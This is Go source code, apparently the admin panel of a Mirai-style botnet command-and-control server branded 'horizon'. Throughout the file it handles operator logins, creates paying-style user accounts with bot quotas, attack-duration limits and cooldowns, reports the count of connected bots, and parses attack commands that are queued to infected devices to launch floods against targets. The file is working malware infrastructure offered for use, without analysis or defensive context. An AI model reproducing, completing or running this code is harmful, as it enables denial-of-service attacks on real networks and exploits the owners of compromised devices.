package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;202musername\x1b[1;97m: "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[38;5;202mpassword\x1b[1;97m: "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }


    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    /*this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[0mvalidating credentials with database .. \x1b[1;34m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(200) * time.Millisecond)
    }*/

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\x1b[1;97mincorrect info\r\n"))
        this.conn.Write([]byte("\x1b[1;97mpress any key to exit"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[1;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;33m             Lightin' \x1b[1;97mthe \x1b[1;91mflame \x1b[1;97mthat ignited the revelation of \x1b[1;95mOsiris\r\n"))
    this.conn.Write([]byte("\x1b[1;97m                           I'm risin' above the \x1b[38;5;202mHorizon\r\n"))
    this.conn.Write([]byte("\x1b[1;97m                             I \x1b[1;90mblackened \x1b[1;97mthe \x1b[1;96mdiamond\r\n"))
    this.conn.Write([]byte("\x1b[1;97m                  And siphoned all of the \x1b[1;34mwater \x1b[1;97msupply of Zion\r\n"))
    this.conn.Write([]byte("\x1b[1;97m\r\n"))

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d_%s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        botCount = clientList.Count()
        //strbotCount := strconv.Itoa(botCount)
        this.conn.Write([]byte("\x1b[1;97m[\x1b[38;5;202m"+username+"\x1b[1;97m@\x1b[38;5;202mhorizon\x1b[1;97m ~]#\033[0m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
   			this.conn.Write([]byte("\033[2J\033[1H"))
   			this.conn.Write([]byte("\x1b[1;97m\r\n"))
   			this.conn.Write([]byte("\x1b[1;33m             Lightin' \x1b[1;97mthe \x1b[1;91mflame \x1b[1;97mthat ignited the revelation of \x1b[1;95mOsiris\r\n"))
   			this.conn.Write([]byte("\x1b[1;97m                           I'm risin' above the \x1b[38;5;202mHorizon\r\n"))
   			this.conn.Write([]byte("\x1b[1;97m                             I \x1b[1;90mblackened \x1b[1;97mthe \x1b[1;96mdiamond\r\n"))
   			this.conn.Write([]byte("\x1b[1;97m                  And siphoned all of the \x1b[1;34mwater \x1b[1;97msupply of Zion\r\n"))
   			this.conn.Write([]byte("\x1b[1;97m\r\n"))
			continue
		}

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m%s\033[0m\r\n", "failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m%s\033[0m\r\n", "failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m%s\033[0m\r\n", "failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("new account info: \r\nusername: " + new_un + "\r\npassword: " + new_pw + "\r\nbotcount: " + max_bots_str + "\r\nadd user to table? (y/n) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m%s\033[0m\r\n", "failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\x1b[38;5;202muser added successfully!\033[0m\r\n"))
            }
            continue
        }
		if userInfo.admin == 1 && cmd == "count" || userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m%s: \x1b[1;97m%d\r\n", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mcount: \x1b[1;97m%d\r\n", botCount)))
            continue
        }
		if userInfo.admin == 0 && cmd == "count" || userInfo.admin == 0 && cmd == "bots" {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202muserInfo.admin == 0\033[0m\r\n")))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("failed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("bot count to send is bigger than allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
